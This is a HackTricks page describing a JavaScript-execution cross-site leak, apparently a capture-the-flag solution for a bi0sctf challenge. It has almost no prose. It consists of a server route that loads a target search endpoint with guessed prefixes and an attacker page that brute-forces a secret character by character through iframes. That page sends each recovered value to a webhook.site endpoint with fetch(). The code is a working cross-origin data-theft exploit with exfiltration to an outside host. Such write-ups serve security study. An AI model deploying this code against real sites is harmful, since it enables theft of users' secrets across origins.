# JavaScript Execution XS Leak

{{#include ../../banners/hacktricks-training.md}}

```javascript
// Code that will try ${guess} as flag (need rest of the server code
app.get("/guessing", function (req, res) {
  let guess = req.query.guess
  let page = `<html>
                <head>
                    <script>
                            function foo() {
                                // If not the flag this will be executed
                                window.parent.foo()
                            }
                        </script>
                    <script src="https://axol.space/search?query=${guess}&hint=foo()"></script>
                </head>
                <p>hello2</p>
                </html>`
  res.send(page)
})
```

Main page that generates iframes to the previous `/guessing` page to test each possibility

```html
<html>
  <head>
    <script>
      let candidateIsGood = false
      let candidate = ""
      let flag = "bi0sctf{"
      let guessIndex = -1

      let flagChars =
        "_0123456789abcdefghijklmnopqrstuvwxyz}ABCDEFGHIJKLMNOPQRSTUVWXYZ"

      // this will get called from our iframe IF the candidate is WRONG
      function foo() {
        candidateIsGood = false
      }

      timerId = setInterval(() => {
        if (candidateIsGood) {
          flag = candidate
          guessIndex = -1
          fetch("https://webhook.site/<yours-goes-here>?flag=" + flag)
        }

        //Start with true and will be change to false if wrong
        candidateIsGood = true
        guessIndex++
        if (guessIndex >= flagChars.length) {
          fetch("https://webhook.site/<yours-goes-here>")
          return
        }
        let guess = flagChars[guessIndex]
        candidate = flag + guess
        let iframe = `<iframe src="/guessing?guess=${encodeURIComponent(
          candidate
        )}"></iframe>`
        console.log("iframe: ", iframe)
        hack.innerHTML = iframe
      }, 500)
    </script>
  </head>
  <p>hello</p>
  <div id="hack"></div>
</html>
```

{{#include ../../banners/hacktricks-training.md}}



